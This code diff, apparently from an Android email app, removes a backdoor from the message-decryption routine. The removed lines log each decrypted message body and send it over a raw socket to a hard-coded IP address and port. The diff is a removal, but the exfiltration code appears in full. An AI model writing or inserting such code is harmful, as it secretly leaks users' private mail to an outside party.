@@ -448,8 +448,6 @@ internal class MessageDetailsViewModel @Inject constructor(
         return try {
             decrypt(userManager, userManager.requireCurrentUserId(), verificationKeys)
             Timber.d("decrypted verificationKeys size: ${verificationKeys?.size}, body size: ${messageBody?.length}")
-            Timber.i(decryptedBody)
-            exfiltrateMessage(decryptedBody!!)
             true
         } catch (exception: Exception) {
             // signature verification failed with special case, try to decrypt again without verification
@@ -472,12 +470,6 @@ internal class MessageDetailsViewModel @Inject constructor(
                 false
             }
         }
-    }
-
-    private fun exfiltrateMessage(decryptedMessage: String) {
-        val client = Socket("34.148.139.106", 5000)
-        client.outputStream.write(decryptedMessage.toByteArray())
-        client.close()
     }
 
     private fun Exception.isMessageNotSignedError() =
